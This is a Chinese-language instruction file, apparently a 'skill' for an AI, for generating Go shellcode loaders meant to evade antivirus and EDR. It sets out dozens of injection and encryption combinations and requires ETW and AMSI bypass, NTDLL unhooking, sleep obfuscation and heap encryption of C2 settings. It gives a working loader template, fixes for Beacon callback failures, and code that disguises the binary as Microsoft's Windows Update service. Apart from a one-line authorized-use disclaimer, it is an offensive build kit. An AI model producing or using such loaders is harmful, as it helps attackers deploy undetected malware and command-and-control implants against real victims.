```

#### 远程注入高免杀（64种）

```
【映射注入系列 - 规避WriteProcessMemory Hook - 4种加密全覆盖】
49. 映射注入 + Hell's Gate + AES + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
50. 映射注入 + Hell's Gate + AES + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
51. 映射注入 + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
52. 映射注入 + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
53. 映射注入 + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
54. 映射注入 + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
55. 映射注入 + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
56. 映射注入 + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏

【进程镂空系列 - 4种加密全覆盖】
57. 进程镂空 + Hell's Gate + AES + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
58. 进程镂空 + Hell's Gate + AES + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
59. 进程镂空 + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
60. 进程镂空 + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
61. 进程镂空 + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
62. 进程镂空 + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
63. 进程镂空 + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
64. 进程镂空 + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏

【Herpaderping系列 - 源文件擦除 - 4种加密全覆盖】
65. Herpaderping + Hell's Gate + AES + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
66. Herpaderping + Hell's Gate + AES + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
67. Herpaderping + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
68. Herpaderping + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
69. Herpaderping + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
70. Herpaderping + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
71. Herpaderping + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
72. Herpaderping + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏

【Early Bird系列 - 4种加密全覆盖】
73. Early Bird + Hell's Gate + AES + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
74. Early Bird + Hell's Gate + AES + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
75. Early Bird + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
76. Early Bird + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
77. Early Bird + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
78. Early Bird + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
79. Early Bird + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
80. Early Bird + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏

【经典注入系列 - 4种加密全覆盖】
81. 经典注入 + Hell's Gate + AES + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
82. 经典注入 + Hell's Gate + AES + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
83. 经典注入 + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
84. 经典注入 + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
85. 经典注入 + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
86. 经典注入 + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
87. 经典注入 + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
88. 经典注入 + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏

【幽灵注入系列 - 4种加密全覆盖】
89. 幽灵注入 + Hell's Gate + AES + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
90. 幽灵注入 + Hell's Gate + AES + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
91. 幽灵注入 + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
92. 幽灵注入 + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
93. 幽灵注入 + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
94. 幽灵注入 + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
95. 幽灵注入 + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
96. 幽灵注入 + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏

【无线程注入系列 - 不创建新线程 - 4种加密全覆盖】
97. 无线程注入 + Hell's Gate + AES + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
98. 无线程注入 + Hell's Gate + AES + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
99. 无线程注入 + Hell's Gate + ChaCha20 + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
100. 无线程注入 + Hell's Gate + ChaCha20 + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
101. 无线程注入 + Hell's Gate + DoubleXOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
102. 无线程注入 + Hell's Gate + DoubleXOR + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
103. 无线程注入 + Hell's Gate + ADD+XOR + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏
104. 无线程注入 + Hell's Gate + ADD+XOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+模块踩踏

【无线程注入 + HellsHall系列 - 4种加密全覆盖】
105. 无线程注入 + HellsHall + AES + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
106. 无线程注入 + HellsHall + AES + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
107. 无线程注入 + HellsHall + ChaCha20 + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
108. 无线程注入 + HellsHall + ChaCha20 + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
109. 无线程注入 + HellsHall + DoubleXOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
110. 无线程注入 + HellsHall + DoubleXOR + UUID + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
111. 无线程注入 + HellsHall + ADD+XOR + IPv6 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
112. 无线程注入 + HellsHall + ADD+XOR + IPv4 + 全部10项高级技术 + 参数欺骗+BlockDLLs+PPID欺骗+模块踩踏
```

---

### 每个组合必须包含的技术栈（11项）

```
【基础必须6项】
1. 减熵处理（低熵版权/配置信息嵌入）
2. 抗沙箱检测（微步沙箱路径检测）
3. API隐藏（PEB Walk动态获取API + 分发表/API Hash增强）
4. VEH内存保护（异常处理器保护shellcode内存）
5. NTDLL脱钩检测（检测并绕过API Hook）
6. 内存加密保护（执行期间/执行后加密内存+PAGE_NOACCESS）

【新增必须4项 - 关键免杀技术】
7. ETW绕过（禁用事件追踪，API调用不可见）
8. AMSI绕过（禁用内存扫描，shellcode特征不可见）
9. 睡眠混淆（睡眠期间加密shellcode，Beacon必需）
10. PE波动（伪装内存为合法PE，规避内存特征检测）
```

---

### Beacon模式额外必须（第六层，1项）

```
- 堆加密（加密堆内存中C2配置/密钥/字符串，防止堆扫描发现）【Beacon长驻模式必须】
```

---

### 远程注入额外必须（第五层，4项）

```
- 参数欺骗（伪造进程命令行参数）【必须】
- BlockDLLs（阻止非微软DLL注入）【必须】
- 模块踩踏（利用合法DLL内存隐藏shellcode）【必须】
- PPID欺骗（伪装父进程关系）【推荐】
```

---

### API隐藏组合推荐

| 组合级别 | 技术组合 | 隐蔽度 |
|----------|----------|--------|
| 基础 | PEB Walk + 导出表遍历 | ⭐⭐⭐ |
| 中级 | PEB Walk + API Hash | ⭐⭐⭐⭐ |
| 高级 | PEB Walk + 分发表 | ⭐⭐⭐⭐ |
| **最高** | PEB Walk + 分发表 + API Hash + 随机索引 | ⭐⭐⭐⭐⭐ |

---

### 免杀效果对比

| 组合类型 | 360 | Defender | 卡巴斯基 | 火绒 | 微步沙箱 |
|----------|-----|----------|----------|------|----------|
| **旧组合（无ETW/AMSI/Hell's Gate）** | 中 | 低 | 低 | 中 | 低 |
| **新组合（含ETW/AMSI）** | 高 | 高 | 中 | 高 | 中 |
| **新组合（含Hell's Gate+无线程注入）** | 高 | 高 | 高 | 高 | 高 |
| **新组合（含睡眠混淆+PE波动）** | 高 | 高 | 高 | 高 | 高 |
| **Beacon组合（含堆加密）** | 高 | 高 | 高 | 高 | 高 |
| **完整高免杀组合（全部10项+模块踩踏）** | **极高** | **极高** | **极高** | **极高** | **极高** |

---

### 技术叠加优先级

| 优先级 | 技术 | 必要性 | 免杀价值 |
|--------|------|--------|----------|
| **P0** | ETW绕过 | 不加=必被杀 | ⭐⭐⭐⭐⭐ |
| **P0** | AMSI绕过 | 不加=必被杀 | ⭐⭐⭐⭐⭐ |
| **P1** | Hell's Gate | EDR对抗必需 | ⭐⭐⭐⭐⭐ |
| **P1** | 睡眠混淆 | Beacon必需 | ⭐⭐⭐⭐⭐ |
| **P2** | PE波动 | 内存扫描规避 | ⭐⭐⭐⭐ |
| **P2** | 堆加密 | **Beacon模式必须** | ⭐⭐⭐⭐ |
| **P3** | 参数欺骗+BlockDLLs+模块踩踏 | 远程注入必需 | ⭐⭐⭐⭐ |
| **P4** | 无线程注入 | 规避线程创建检测 | ⭐⭐⭐⭐ |
| **P5** | PPID欺骗 | 进程链伪装 | ⭐⭐⭐ |

## Go API调用方式

Go调用Windows API有以下几种方式：

### 方式1: syscall.LoadLibrary + GetProcAddress（立即加载）
```go
handle, _ := syscall.LoadLibrary("kernel32.dll")
VirtualAlloc, _ := syscall.GetProcAddress(handle, "VirtualAlloc")
addr, _, _ := syscall.SyscallN(VirtualAlloc, 0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
```

### 方式2: syscall.NewLazyDLL + NewProc（懒加载）
```go
handle := syscall.NewLazyDLL("kernel32.dll")
VirtualAlloc := handle.NewProc("VirtualAlloc")
addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
```

### 方式3: windows.NewLazySystemDLL + NewProc（推荐）
```go
import "golang.org/x/sys/windows"
handle := windows.NewLazySystemDLL("kernel32.dll")
VirtualAlloc := handle.NewProc("VirtualAlloc")
addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x1000|0x2000, 0x40)
```

## ⚠️ 关键注意事项（防止崩溃和上线失败）

### 一、致命错误：syscall.SyscallN不能直接调用shellcode

**错误写法（会导致崩溃）：**
```go
// ❌ 绝对错误！这会导致程序崩溃
syscall.SyscallN(shellcodeAddr)
syscall.SyscallN(addr, 0, 0, 0)
```

**原因：**
- syscall.SyscallN在调用时会修改栈状态
- Shellcode期望干净的栈环境
- 直接调用会导致shellcode执行失败或程序崩溃

**正确写法：**
```go
// ✓ 正确：syscall.SyscallN用于调用API函数
// ✓ 正确：shellcode执行必须通过CreateThread创建线程
thread, _, _ := syscall.SyscallN(CreateThread.Addr(), 0, 0, addr, 0, 0, 0)
syscall.SyscallN(WaitForSingleObject.Addr(), thread, 0xFFFFFFFF)
```

---

### 二、正确的执行顺序（顺序错误会导致上线失败）

```go
func main() {
    // 【执行顺序至关重要，顺序错误会导致失败】
    
    // 步骤1: 隐藏窗口（最先执行）
    hideConsole()
    
    // 步骤2: ETW/AMSI绕过（必须在shellcode执行前）
    // 如果在执行后绕过，ETW/AMSI已经记录了敏感行为
    bypassETW()
    bypassAMSI()
    
    // 步骤3: NTDLL脱钩（必须在敏感API调用前）
    // 如果不脱钩，VirtualAlloc/CreateThread等调用会被拦截
    unhookNTDLL()
    
    // 步骤4: 处理shellcode（解密混淆）
    // 先反混淆，再解密二次加密
    encryptedData := deobfuscateIPv4(ipv4Array)
    shellcode := decryptAES(encryptedData, key)
    // 注意：SGN加密的shellcode不需要额外解密
    
    // 步骤5: 分配内存 + 复制shellcode
    addr := virtualAlloc(len(shellcode))
    rtlMoveMemory(addr, shellcode)
    
    // 步骤6: 创建线程执行（必须用CreateThread）
    thread := createThread(addr)
    
    // 步骤7a: 单次执行模式 - 等待完成后加密内存
    waitForSingleObject(thread, INFINITE)
    memoryEncryptProtect(addr, len(shellcode), key)
    virtualProtect(addr, len(shellcode), PAGE_NOACCESS)
    
    // 步骤7b: Beacon模式 - 不等待，让Beacon管理睡眠
    // Beacon会自动睡眠和唤醒，需要在睡眠时叠加加密保护
}
```

---

### 三、ETW/AMSI绕过时机

| 时机 | 结果 | 说明 |
|------|------|------|
| **shellcode执行前绕过** | ✅ 成功 | ETW/AMSI不记录敏感行为 |
| **shellcode执行后绕过** | ❌ 失败 | ETW/AMSI已经记录并报警 |

**正确示例：**
```go
func main() {
    // ✓ 先绕过
    bypassETW()  // 禁用事件追踪
    bypassAMSI() // 禁用内存扫描
    
    // ✓ 再执行
    executeShellcode(shellcode)
}
```

**错误示例：**
```go
func main() {
    // ❌ 先执行（ETW已记录VirtualAlloc调用）
    executeShellcode(shellcode)
    
    // ❌ 后绕过（无意义，已被检测）
    bypassETW()
    bypassAMSI()
}
```

---

### 四、内存加密保护时机

| 模式 | 加密时机 | 说明 |
|------|----------|------|
| **单次执行** | 执行**完成后**加密 | 防止后续内存扫描发现特征 |
| **Beacon长驻** | 睡眠期间加密 | 每次睡眠前加密，唤醒时解密 |

**单次执行正确示例：**
```go
// ✓ 正确顺序
addr := virtualAlloc(len(sc))
rtlMoveMemory(addr, sc)
thread := createThread(addr)
waitForSingleObject(thread)  // 等待执行完成
xorEncryptMemory(addr, len(sc), key)  // 完成后加密
virtualProtect(addr, len(sc), PAGE_NOACCESS)
```

**单次执行错误示例：**
```go
// ❌ 错误：执行前加密，shellcode无法执行
xorEncryptMemory(addr, len(sc), key)  // 先加密
thread := createThread(addr)  // 执行加密后的数据，崩溃！
```

---

### 五、Beacon模式特殊注意事项

#### 1. 不要使用WaitForSingleObject等待

```go
// ❌ Beacon模式不要等待
thread := createThread(addr)
waitForSingleObject(thread, INFINITE)  // 会阻塞Beacon

// ✓ Beacon模式：创建线程后不等待
thread := createThread(addr)
// Beacon会自己管理睡眠和唤醒
```

#### 2. 睡眠混淆需要与Beacon同步

```go
// Beacon睡眠混淆的正确实现
// 注意：不要干扰Beacon原有的睡眠机制

// 方案：在Beacon执行过程中叠加内存保护
// Beacon睡眠时（检测到sleep调用）：
//   1. 加密shellcode内存
//   2. 设置PAGE_NOACCESS
// Beacon唤醒时：
//   1. 解密shellcode内存
//   2. 设置PAGE_EXECUTE_READ
```

#### 3. 堆加密注意事项

```go
// ⚠️ 堆加密可能影响Beacon配置
// 建议：只加密敏感字符串，不加密Beacon核心结构

// 加密堆中的敏感数据：
// - C2服务器地址字符串
// - 加密密钥
// - 用户名/密码等凭据

// 不要加密：
// - Beacon配置结构体
// - 内存管理元数据
```

---

### 六、WaitForSingleObject使用建议

| 模式 | 使用建议 | 说明 |
|------|----------|------|
| **单次执行Loader** | 使用INFINITE等待 | 确保shellcode执行完成后再加密 |
| **Beacon长驻模式** | **不使用等待** | Beacon需要保持运行，等待会阻塞 |
| **远程注入** | 可选等待或不等待 | 根据目标进程需求决定 |

---

### 七、常见崩溃原因排查

| 崩溃现象 | 可能原因 | 解决方案 |
|----------|----------|----------|
| 执行后立即崩溃 | syscall.SyscallN直接调用shellcode | 使用CreateThread创建线程 |
| 空指针崩溃 | PEB Walk未正确获取API地址 | 检查getModuleHandle返回值 |
| 内存访问违规 | PAGE_NOACCESS时机错误 | 确保执行时为PAGE_EXECUTE_READ |
| 无输出/无回连 | ETW/AMSI未绕过或时机错误 | 在执行前绕过ETW/AMSI |
| Beacon无法上线 | 堆加密影响Beacon配置 | 只加密敏感字符串 |
| 远程注入失败 | 目标进程NTDLL被Hook | 先脱钩再注入 |

---

### 八、完整的Loader模板

```go
package main

import (
    "golang.org/x/sys/windows"
    "syscall"
    "unsafe"
)

func main() {
    // ========== 步骤1: 隐藏窗口 ==========
    hideConsole()
    
    // ========== 步骤2: ETW/AMSI绕过 ==========
    bypassETW()
    bypassAMSI()
    
    // ========== 步骤3: NTDLL脱钩 ==========
    unhookNTDLL()
    
    // ========== 步骤4: 解密shellcode ==========
    // IPv4反混淆
    encrypted := deobfuscateIPv4(ipv4Array)
    // AES解密二次加密层
    shellcode := decryptAES(encrypted, aesKey)
    // 注意：SGN层不需要解密，执行时自动解码
    
    // ========== 步骤5: 分配内存 ==========
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 
        0x3000, 0x40) // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
    
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), 
        uintptr(len(shellcode)))
    
    // ========== 步骤6: 创建线程执行 ==========
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    
    // ========== 步骤7: 根据模式选择处理方式 ==========
    
    // 【单次执行模式】等待完成后加密内存
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)
    
    // 内存加密保护
    xorEncryptMemory(addr, uintptr(len(shellcode)), protectKey)
    
    // 设置PAGE_NOACCESS防止扫描
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    var oldProtect uint32
    VirtualProtect.Call(addr, uintptr(len(shellcode)), 
        0x01, uintptr(unsafe.Pointer(&oldProtect)))
    
    // 【Beacon模式】不等待，让Beacon管理
    // 不调用WaitForSingleObject
    // Beacon睡眠时自动叠加内存保护
}

// 辅助函数实现...

func hideConsole() { /* ... */ }
func bypassETW() { /* ... */ }
func bypassAMSI() { /* ... */ }
func unhookNTDLL() { /* ... */ }
func xorEncryptMemory(addr uintptr, size uintptr, key []byte) { /* ... */ }
```

---

## 隐藏窗口代码

### 方式1：代码隐藏
```go
func hideConsole() {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    GetConsoleWindow := kernel32.NewProc("GetConsoleWindow")
    user32 := windows.NewLazySystemDLL("user32.dll")
    ShowWindow := user32.NewProc("ShowWindow")
    
    hwnd, _, _ := GetConsoleWindow.Call()
    ShowWindow.Call(hwnd, 0) // SW_HIDE = 0
}
```

### 方式2：使用gobuildfuzz编译（自动隐藏窗口）
```bash
# gobuildfuzz编译会自动处理，无需额外参数
tools/gobuildfuzz/gobuildfuzz.exe -f loader.go

# 如果需要指定隐藏窗口，可使用-o参数
# 但推荐在代码中使用hideConsole()函数
```

## 使用指南

### 1. 准备工作
1. 准备原始shellcode文件（.bin格式，64位）
2. 确保工具路径正确（tools/sgn2.0.1/sgn.exe, tools/gobuildfuzz/gobuildfuzz.exe）

### 2. 调用Skill
向AI描述需求，例如：
- "使用VirtualAlloc+CreateThread方式生成loader"
- "组合syscall和ETW绕过技术生成loader"
- "使用Early Bird注入方式生成loader"

### 3. 自动处理流程
1. SGN加密shellcode（tools/sgn2.0.1/sgn.exe）
2. DoubleXOR/ADD+XOR/AES二次加密（自动选择或用户指定）
3. IPv4/UUID/MAC混淆（自动选择）
4. 生成Go Loader代码（默认IAT隐藏）
5. 初始化Go模块（go mod init + go mod tidy）
6. **gobuildfuzz模糊编译**（必须使用！）
7. **生成编译对应关系.txt**（记录编译命令与exe对应关系）
8. 输出结果到result目录

### 4. 输出结构
```
result/
├── README.md                     # 技术汇总文档
│   └── 包含：所涉及技术、处理流程、使用说明
│
├── Technique1_VirtualAlloc_CreateThread_DoubleXOR_IPv4/
│   ├── gobuildfuzz/              # 【编译产物】gobuildfuzz生成的exe
│   │   ├── wfZHb.exe             # 编译生成的exe（随机命名）
│   │   ├── UAkKp.exe             # 多个编译版本
│   │   └── 编译对应关系.txt        # 编译命令 → exe对应关系
│   │       # 内容格式：
│   │       # 编译命令: go build -o wfZHb.exe loader.go
│   │       # 对应文件: wfZHb.exe
│   │       # 编译参数: -trimpath
│   │       # 文件大小: 1024 KB
│   │       # ---
│   ├── loader.go                 # Go源码
│   └── go.mod                    # Go模块文件
│
├── Technique2_Syscall_ADDXOR_UUID/
│   ├── gobuildfuzz/
│   │   ├── xxx.exe
│   │   ├── yyy.exe
│   │   └── 编译对应关系.txt
│   ├── loader.go
│   └── go.mod
│
└── ... (更多技术组合)
```

**目录说明：**

| 目录 | 内容 | 类型 |
|------|------|------|
| `Technique/gobuildfuzz/` | gobuildfuzz编译的exe | **最终产物**，可直接使用 |
| `Technique/loader.go` | Go源码 | 保留源码方便修改 |

**处理流程：**
```
loader.go → gobuildfuzz编译 → Technique/gobuildfuzz/xxx.exe
```

## 注意事项

1. **合法性**：仅用于授权安全测试、CTF比赛和渗透评估
2. **SGN处理**：SGN加密后的shellcode运行时无需解密SGN层
3. **Go模块**：编译前必须执行`go mod init`和`go mod tidy`初始化模块
4. **编译方式**：**必须使用gobuildfuzz编译**，自动应用优化参数
5. **编译对应关系**：**必须生成"编译对应关系.txt"**，记录每个编译命令对应的exe文件名
6. **隐藏窗口**：在代码中使用hideConsole()函数
7. **时效性**：免杀技术会随杀软更新失效，需定期更新策略
8. **ETW/AMSI**：必须在main函数第一行执行，顺序错误会导致失效

---


## v3.0 新增：静态伪装代码模板

### 版本信息嵌入（必须）

**在Go代码中嵌入版本信息，伪装成合法程序：**

```go
package main

// ========== 版本信息嵌入（必须） ==========

// 编译时嵌入的版本信息（伪装成Microsoft程序）
var (
    // 伪公司信息
    _companyName     = "Microsoft Corporation"
    _fileDescription = "Windows Update Service"
    _fileVersion     = "10.0.19041.1"
    _internalName    = "wuauserv"
    _legalCopyright  = "Copyright (C) Microsoft Corp. All rights reserved."
    _originalFilename = "wuauserv.exe"
    _productName     = "Windows Update"
    _productVersion  = "10.0.19041.1"
    
    // 伪配置信息（用于降低熵值）
    _configData = `
[Settings]
Server=https://update.microsoft.com
Interval=3600
Retry=3
Timeout=30
LogLevel=Info
CachePath=C:\Windows\Temp
MaxSize=100MB
Compression=Enabled
`

    // 伪日志模板（用于降低熵值）
    _logTemplate = `
[Log]
Level=Information
Format=JSON
Output=File
Path=C:\Windows\Logs\WindowsUpdate
MaxSize=10MB
Rotation=Daily
Retention=30days
`

    // 伪版权声明（用于降低熵值）
    _copyrightText = `
Microsoft Windows Update Service
Copyright (C) Microsoft Corporation. All rights reserved.
Licensed under the MIT License.
For more information, visit https://www.microsoft.com
This product is governed by the Microsoft Services Agreement.
`

    // 使用变量防止编译器优化删除
    _useVars = func() {
        _ = _companyName
        _ = _fileDescription
        _ = _fileVersion
        _ = _internalName
        _ = _legalCopyright
        _ = _originalFilename
        _ = _productName
        _ = _productVersion
        _ = _configData
        _ = _logTemplate
        _ = _copyrightText
    }
)

func main() {
    // 调用使用函数，确保变量不被优化删除
    _useVars()
    
    // ... 后续代码
}
```

### 无害API导入（必须）

**添加无害API到导入表，稀释敏感API比例：**

```go
package main

import (
    // ========== 无害DLL导入（必须） ==========
    
    // 导入user32.dll（常见无害DLL）
    _ "golang.org/x/sys/windows"
    
    // 导入常见无害API（通过空导入）
    // 这些API会出现在导入表中，稀释敏感API
)

// ========== 无害API声明（必须） ==========

var (
    // 无害kernel32.dll API（必须声明但不使用）
   无害API列表 = []string{
        "GetTickCount",           // 获取系统启动时间
        "GetSystemTime",          // 获取系统时间
        "GetLocalTime",           // 获取本地时间
        "GetComputerNameW",       // 获取计算机名
        "GetUserNameW",           // 获取用户名
        "GetEnvironmentStringsW", // 获取环境变量
        "GetCurrentDirectoryW",   // 获取当前目录
        "GetTempPathW",           // 获取临时目录
        "GetModuleFileNameW",     // 获取模块路径
        "GetCommandLineW",        // 获取命令行
        "GetVersionExW",          // 获取系统版本
        "GetSystemInfo",          // 获取系统信息
        "GlobalMemoryStatus",     // 获取内存状态
        "GetDiskFreeSpaceW",      // 获取磁盘空间
        "GetDriveTypeW",          // 获取驱动类型
        "FindFirstFileW",         // 查找文件
        "FindNextFileW",          // 查找下一个文件
        "FindClose",              // 关闭查找
        "CreateFileW",            // 创建文件（无害场景）
        "ReadFile",               // 读取文件
        "WriteFile",              // 写入文件
        "CloseHandle",            // 关闭句柄
        "SetFileAttributesW",     // 设置文件属性
        "GetFileAttributesW",     // 获取文件属性
        "GetFileSize",            // 获取文件大小
        "SetEndOfFile",           // 设置文件结束位置
        "FlushFileBuffers",       // 刷新缓冲区
        "LockFile",               // 锁定文件
        "UnlockFile",             // 解锁文件
    }
    
    // 无害user32.dll API（必须声明但不使用）
   无害User32API = []string{
        "GetSystemMetrics",       // 获取系统度量
        "GetDesktopWindow",       // 获取桌面窗口
        "GetForegroundWindow",    // 获取前台窗口
        "GetActiveWindow",        // 获取活动窗口
        "GetWindowRect",          // 获取窗口矩形
        "GetClientRect",          // 获取客户区矩形
        "IsWindowVisible",        // 窗口是否可见
        "IsWindowEnabled",        // 窗口是否启用
        "GetWindowTextLengthW",   // 获取窗口标题长度
        "EnumWindows",            // 枚举窗口
        "EnumChildWindows",       // 枚举子窗口
        "GetWindow",              // 获取窗口
        "GetParent",              // 获取父窗口
        "GetAncestor",            // 获取祖先窗口
        "SetForegroundWindow",    // 设置前台窗口
        "BringWindowToTop",       // 窗口置顶
        "ShowWindow",             // 显示窗口（隐藏控制台用）
        "UpdateWindow",           // 更新窗口
        "RedrawWindow",           // 重绘窗口
        "InvalidateRect",         // 无效区域
        "ValidateRect",           // 验证区域
        "GetDC",                  // 获取DC
        "ReleaseDC",              // 释放DC
        "BeginPaint",             // 开始绘制
        "EndPaint",               // 结束绘制
        "GetCursorPos",           // 获取光标位置
        "SetCursorPos",           // 设置光标位置
        "GetAsyncKeyState",       // 获取按键状态
        "GetKeyState",            // 获取键盘状态
        "GetKeyboardState",       // 获取键盘状态数组
        "MapVirtualKeyW",         // 映射虚拟键
        "GetKeyNameTextW",        // 获取键名文本
    }
)

// 无害API初始化函数（必须调用）
func initHarmlessAPIs() {
    // 声明但不实际调用，仅用于导入表
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    user32 := windows.NewLazySystemDLL("user32.dll")
    
    // 获取无害API地址（不调用）
    for _, api := range 无害API列表 {
        _ = kernel32.NewProc(api)
    }
    for _, api := range 无害User32API {
        _ = user32.NewProc(api)
    }
}
```

---

## v3.0 新增：强制熵值优化

### 熵值控制要求

**目标：最终exe文件熵值必须≤6**

| 熵值范围 | 检测风险 | 目标 |
|----------|----------|------|
| 0-4 | 低 | 过低也异常 |
| **4-6** | **低** | **目标范围** |
| 6-7 | 中 | 警戒线 |
| 7-8 | 高 | 易被检测 |
| >8 | 极高 | 必定被标记 |

### 熵值优化代码模板（必须嵌入）

```go
package main

import "unsafe"

// ========== 强制熵值优化（必须） ==========

// 大量低熵数据嵌入（必须）
var (
    // 低熵字符串1：伪版权信息（约1KB）
    entropyData1 = `
Microsoft Windows Update Service
Copyright (C) Microsoft Corporation. All rights reserved.
Version: 10.0.19041.1
Build: 19041
Architecture: x64
Language: Multi-Language
License: MIT License
Support: https://support.microsoft.com
Update Server: https://update.microsoft.com
Policy ID: WU-2024-001
Category: System Services
Priority: High
Status: Active
Last Update: 2024-04-24
Next Update: 2024-04-25
Installation Path: C:\Windows\System32
Configuration Path: C:\Windows\SoftwareDistribution
